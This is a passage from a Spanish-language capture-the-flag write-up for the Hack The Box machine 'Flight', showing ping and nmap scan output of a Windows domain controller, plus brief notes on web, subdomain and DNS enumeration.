<span class="line"><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">--</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">11</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">187</span><span style="color:#393A34;--shiki-dark:#BABED8"> ping statistics </span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">--</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#393A34;--shiki-dark:#BABED8"> packets transmitted</span><span style="color:#999999;--shiki-dark:#89DDFF">,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#393A34;--shiki-dark:#BABED8"> received</span><span style="color:#999999;--shiki-dark:#89DDFF">,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#AB5959;--shiki-dark:#89DDFF">%</span><span style="color:#393A34;--shiki-dark:#BABED8"> packet loss</span><span style="color:#999999;--shiki-dark:#89DDFF">,</span><span style="color:#393A34;--shiki-dark:#BABED8"> time </span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">0ms</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">rtt </span><span style="color:#998418;--shiki-dark:#82AAFF">min</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">avg</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#998418;--shiki-dark:#82AAFF">max</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">mdev </span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 155.284</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">155.284</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">155.284</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">0.000</span><span style="color:#393A34;--shiki-dark:#BABED8"> ms</span></span></code></pre> 
<h2 id="ttl--127-windows">TTL = 127 Windows</h2>
<h2 id="nmap">nmap</h2>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Starting Nmap </span><span style="color:#2F798A;--shiki-dark:#F78C6C">7.</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">94SVN</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#393A34;--shiki-dark:#BABED8"> https</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#AB5959;--shiki-dark:#89DDFF">//</span><span style="color:#393A34;--shiki-dark:#BABED8">nmap</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">org</span><span style="color:#999999;--shiki-dark:#89DDFF"> )</span><span style="color:#393A34;--shiki-dark:#BABED8"> at </span><span style="color:#2F798A;--shiki-dark:#F78C6C">2024</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#2F798A;--shiki-dark:#F78C6C">0</span><span style="color:#B31D28;--shiki-dark:#F78C6C;font-style:italic;--shiki-dark-font-style:inherit">8</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#2F798A;--shiki-dark:#F78C6C">10</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 11</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">22</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> EDT</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Nmap scan report </span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">for</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">11</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">187</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Host </span><span style="color:#AB5959;--shiki-dark:#89DDFF">is</span><span style="color:#393A34;--shiki-dark:#82AAFF"> up </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#2F798A;--shiki-dark:#F78C6C">0.</span><span style="color:#B31D28;--shiki-dark:#82AAFF;font-style:italic;--shiki-dark-font-style:inherit">16s</span><span style="color:#393A34;--shiki-dark:#82AAFF"> latency</span><span style="color:#999999;--shiki-dark:#89DDFF">).</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Not shown</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 65517</span><span style="color:#393A34;--shiki-dark:#BABED8"> filtered tcp </span><span style="color:#393A34;--shiki-dark:#82AAFF">ports </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#393A34;--shiki-dark:#82AAFF">no</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#82AAFF">response</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Some closed ports may be reported </span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">as</span><span style="color:#393A34;--shiki-dark:#BABED8"> filtered due to </span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">--</span><span style="color:#393A34;--shiki-dark:#BABED8">defeat</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">rst</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">ratelimit</span></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#BABED8">PORT</span><span style="color:#A65E2B;--shiki-dark:#BABED8">      STATE</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> SERVICE</span><span style="color:#A65E2B;--shiki-dark:#BABED8">       VERSION</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">53</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp    </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  domain        Simple </span><span style="color:#A65E2B;--shiki-dark:#BABED8">DNS</span><span style="color:#393A34;--shiki-dark:#BABED8"> Plus</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">80</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp    </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  http          Apache httpd </span><span style="color:#2F798A;--shiki-dark:#F78C6C">2.4</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">52</span><span style="color:#999999;--shiki-dark:#89DDFF"> ((</span><span style="color:#393A34;--shiki-dark:#BABED8">Win64</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#393A34;--shiki-dark:#BABED8"> OpenSSL</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1.1</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">1m</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> PHP</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">8.1</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">1</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#393A34;--shiki-dark:#BABED8"> http</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">methods</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#393A34;--shiki-dark:#BABED8">_  Potentially risky methods</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> TRACE</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#393A34;--shiki-dark:#BABED8">_http</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">title</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> g0 Aviation</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#393A34;--shiki-dark:#BABED8">_http</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">server</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">header</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> Apache</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2.4</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">52</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#393A34;--shiki-dark:#BABED8">Win64</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#393A34;--shiki-dark:#BABED8"> OpenSSL</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1.1</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">1m</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> PHP</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">8.1</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">1</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">88</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp    </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  kerberos</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">sec  Microsoft Windows </span><span style="color:#393A34;--shiki-dark:#82AAFF">Kerberos </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#393A34;--shiki-dark:#82AAFF">server time</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2024</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#2F798A;--shiki-dark:#F78C6C">0</span><span style="color:#B31D28;--shiki-dark:#F78C6C;font-style:italic;--shiki-dark-font-style:inherit">8</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#2F798A;--shiki-dark:#F78C6C">10</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 22</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">22</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#B31D28;--shiki-dark:#82AAFF;font-style:italic;--shiki-dark-font-style:inherit">50Z</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">135</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp   </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  msrpc         Microsoft Windows </span><span style="color:#A65E2B;--shiki-dark:#BABED8">RPC</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">139</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp   </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  netbios</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">ssn   Microsoft Windows netbios</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">ssn</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">389</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp   </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  ldap          Microsoft Windows Active Directory </span><span style="color:#393A34;--shiki-dark:#82AAFF">LDAP </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#393A34;--shiki-dark:#82AAFF">Domain</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#82AAFF"> flight</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">htb0</span><span style="color:#999999;--shiki-dark:#89DDFF">.,</span><span style="color:#393A34;--shiki-dark:#82AAFF"> Site</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#82AAFF"> Default</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#82AAFF">First</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#82AAFF">Site</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#82AAFF">Name</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">445</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp   </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  microsoft</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">ds</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">?</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">464</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp   </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  kpasswd5</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">?</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">593</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp   </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  ncacn_http    Microsoft Windows </span><span style="color:#A65E2B;--shiki-dark:#BABED8">RPC</span><span style="color:#393A34;--shiki-dark:#BABED8"> over </span><span style="color:#A65E2B;--shiki-dark:#BABED8">HTTP</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1.0</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">636</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp   </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  tcpwrapped</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">3268</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp  </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  ldap          Microsoft Windows Active Directory </span><span style="color:#393A34;--shiki-dark:#82AAFF">LDAP </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#393A34;--shiki-dark:#82AAFF">Domain</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#82AAFF"> flight</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">htb0</span><span style="color:#999999;--shiki-dark:#89DDFF">.,</span><span style="color:#393A34;--shiki-dark:#82AAFF"> Site</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#82AAFF"> Default</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#82AAFF">First</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#82AAFF">Site</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#82AAFF">Name</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">3269</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp  </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  tcpwrapped</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">9389</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp  </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  mc</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">nmf        </span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#A65E2B;--shiki-dark:#F07178">NET</span><span style="color:#393A34;--shiki-dark:#BABED8"> Message Framing</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">49667</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  msrpc         Microsoft Windows </span><span style="color:#A65E2B;--shiki-dark:#BABED8">RPC</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">49673</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  ncacn_http    Microsoft Windows </span><span style="color:#A65E2B;--shiki-dark:#BABED8">RPC</span><span style="color:#393A34;--shiki-dark:#BABED8"> over </span><span style="color:#A65E2B;--shiki-dark:#BABED8">HTTP</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1.0</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">49674</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  msrpc         Microsoft Windows </span><span style="color:#A65E2B;--shiki-dark:#BABED8">RPC</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">49687</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  msrpc         Microsoft Windows </span><span style="color:#A65E2B;--shiki-dark:#BABED8">RPC</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">49694</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">tcp </span><span style="color:#998418;--shiki-dark:#82AAFF">open</span><span style="color:#393A34;--shiki-dark:#BABED8">  msrpc         Microsoft Windows </span><span style="color:#A65E2B;--shiki-dark:#BABED8">RPC</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Service Info</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> Host</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> G0; </span><span style="color:#A65E2B;--shiki-dark:#BABED8">OS</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> Windows; </span><span style="color:#A65E2B;--shiki-dark:#BABED8">CPE</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> cpe</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">o</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8">microsoft</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8">windows</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Host script results</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#393A34;--shiki-dark:#BABED8"> smb2</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">time</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#393A34;--shiki-dark:#BABED8">   date</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2024</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#2F798A;--shiki-dark:#F78C6C">0</span><span style="color:#B31D28;--shiki-dark:#F78C6C;font-style:italic;--shiki-dark-font-style:inherit">8</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">10T22</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">23</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">44</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#393A34;--shiki-dark:#BABED8">_  start_date</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> N</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">A</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#393A34;--shiki-dark:#BABED8">_clock</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">skew</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit"> 6h59m58s</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#393A34;--shiki-dark:#BABED8"> smb2</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">security</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">mode</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   3</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#393A34;--shiki-dark:#BABED8">_    Message signing enabled </span><span style="color:#AB5959;--shiki-dark:#89DDFF">and</span><span style="color:#393A34;--shiki-dark:#BABED8"> required</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Service detection performed</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178"> Please</span><span style="color:#393A34;--shiki-dark:#BABED8"> report </span><span style="color:#998418;--shiki-dark:#82AAFF">any</span><span style="color:#393A34;--shiki-dark:#BABED8"> incorrect results at https</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#AB5959;--shiki-dark:#89DDFF">//</span><span style="color:#393A34;--shiki-dark:#BABED8">nmap</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">org</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">submit</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#999999;--shiki-dark:#89DDFF"> .</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Nmap done</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> IP</span><span style="color:#393A34;--shiki-dark:#82AAFF"> address </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#393A34;--shiki-dark:#82AAFF"> host up</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#393A34;--shiki-dark:#BABED8"> scanned </span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">in</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 127.63</span><span style="color:#393A34;--shiki-dark:#BABED8"> seconds</span></span></code></pre> 
<h2 id="enumeración-del-puerto-80-http">Enumeración del puerto 80 (HTTP)</h2>
<p>por el momento no tenemos nada interesante en la pagina web así que seguiremos enumerando.</p>
<img src="/src/assets/images/Img/20240810113207.png"/>
<h2 id="fuzzing-con-wfuzz">Fuzzing con wfuzz</h2>
<p>haciendo una enumeración de subdominios logramos encontrar uno llamado <code>school</code></p>
<img src="/src/assets/images/Img/20240810114633.png"/>
<p><code>school</code>
parece que en la pagina web de <code>school</code> tampoco obtenemos nada interesante.</p>
<img src="/src/assets/images/Img/20240810114823.png"/>
<h2 id="enumeración-del-puerto-53-dns">Enumeración del puerto 53 (DNS)</h2>
<p>en esta enumeración nos aseguramos que no existe otro nombre de dominio y también obtenemos la dirección ip V6</p>
<img src="/src/assets/images/Img/20240810115616.png"/>
<h2 id="dirsearch">dirsearch</h2>
